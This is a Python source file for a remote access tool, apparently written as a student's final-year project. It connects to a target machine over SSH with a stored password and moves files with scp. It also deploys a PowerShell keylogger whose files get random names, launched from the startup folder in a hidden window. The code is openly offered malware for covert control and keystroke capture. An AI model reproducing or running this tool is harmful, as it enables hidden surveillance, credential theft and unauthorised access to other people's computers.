#!/usr/bin/python
#python console for RAT 
# Created by : Luke O'Sullivan

#imports
import os
from signal import pause
import sys
import getpass
from modules import *
from paramiko import SSHClient
import random as r






#variable help menu
banner = """
 ___________    ____ .______         .______          ___   .___________.
|   ____\   \  /   / |   _  \        |   _  \        /   \  |           |
|  |__   \   \/   /  |  |_)  |       |  |_)  |      /  ^  \ `---|  |----`
|   __|   \_    _/   |   ___/        |      /      /  /_\  \    |  |     
|  |        |  |     |  |            |  |\  \----./  _____  \   |  |     
|__|        |__|     | _|            | _| `._____/__/     \__\  |__|

        [::] Remote access toolkit for Final Year Project [::]
        [::] Created by : Luke O'Sullivan [::]                                                                                                                                                                                
"""

help_menu = """
        Arguments:
            -t <ipaddress>   = Run rat on target ip address
            XXX.rat = configuration file to add to rat

        Example:
            python3 main.py -t 192.168.56.100
            python3 main.py -f luke.rat
"""
options_menu = """
        [*] Select A Number to select a Payload [*]

        Payloads:
            [0] Remote Console
            [1] Keylogger

"""

username = getpass.getuser()
header = f"{username}@rat $"
local_path = f"/home/{username}/.RAT" if username != "root" else "/root/.RAT"
remote_path = "raw.githubusercontent.com/lukeeeeeee335/RAT/main"

def random_text():
    lower_case = "abcdefghijklmnopqrstuvwxyz"
    upper_case = "abcdefghijklmnopqrstuvwxyz".upper()

    charchters = lower_case + upper_case
    generated_text = ""

    for i in range(5):
        generated_text+= r.choice(list(charchters))
        return generated_text


#Read config file
def read_config(config_file):
    configuration = {} #empty dictonary
    read_lines = open(config_file, "r").readlines() #"r" is open in read mode, function just reads line of the config file 
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = read_lines[2].strip()
    configuration["STARTUPDIRECTORY"] = read_lines[3].strip()


    return configuration

def os_detection():
    #Windows
    if os.name == "nt":
        return "w"
    #Other
    if os.name == "posix":
        return "L"
    
#connect rat to target
def connect(address, password):
    #REMOTLY CORRECT
    os.system(f"sshpass -p \"{password}\" ssh rat@{address} 'powershell'")
    #target = SSHClient()
    #target.connect(address, username='rat', password=target_password)

#remote upload with SCP to trasfer files from win to kali
def remoteupload(address, password, upload_file, path):
    os.system(f"sshpass -p \"{password}\" scp {upload_file} rat@{address}:{path}")

#remote download with SCP
def remotedownload(address, password, download_file, path):
    os.system(f"sshpass -p \"{password}\" scp -r rat@{address}:{path} {local_path}")



def keylogger(address, target_password, working_dir, startup_dir):
    keylogger = (f"{local_path}/payloads/keylogger.ps1")
    controller = (f"{local_path}/payloads/c.cmd")
    scheduler = (f"{local_path}/payloads/l.ps1")

    # obfuscated files
    obfuscated_controller = random_text() + ".cmd"
    obfuscated_keylogger = random_text() + ".ps1"
    obfuscated_scheduler = random_text() + ".ps1"

    with open(obfuscated_controller, "w") as f:
        f.write("@echo off")
        f.write(f"powershell Start-Process powershell.exe -windowstyle hidden \"{working_dir}/\"")

            

    #file staging 
    os.system(f"cp {controller} {local_path}/{obfuscated_controller}")
    os.system(f"cp {keylogger} {local_path}/{obfuscated_keylogger}")
    os.system(f"cp {scheduler} {local_path}/{obfuscated_scheduler}")

    #remote upload
    remoteupload(address, target_password, obfuscated_controller, startup_dir) #for controller
    remoteupload(address, target_password, obfuscated_keylogger, working_dir) #for Keylogger
    remoteupload(address, target_password, obfuscated_scheduler, working_dir) #for scheduler






#terminate programe
def exit():
    sys.exit()

#Command Line interface
def cli(arguments):
    #DISPLAY BANNER
    print(banner)

    #if arguments exsist
    if arguments:
        print(options_menu)
        option = input(f"{header}")
        try:
            configuration = read_config(sys.argv[1])
        except FileNotFoundError:
            print("[!!] File Does Not Exsist")
            exit()
        
        #get config info
        address = configuration.get("IPADDRESS")
        target_password = configuration.get("PASSWORD")
        working_dir = configuration.get("WORKINGDIRECTORY")
        startup_dir = configuration.get("STARTUPDIRECTORY")

        if option == "0":
            connect(address, target_password)

        elif option == "1":
            keylogger(address, target_password, working_dir, startup_dir)






    # If arguments dont exsist
    else:
        print(help_menu)


#main code
def main():
    
    #check for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
        argument = "Please Include an IP address"
    else:
        arguments_exist = True
    cli(arguments_exist)

#runs main code
if __name__ =="__main__":
    main()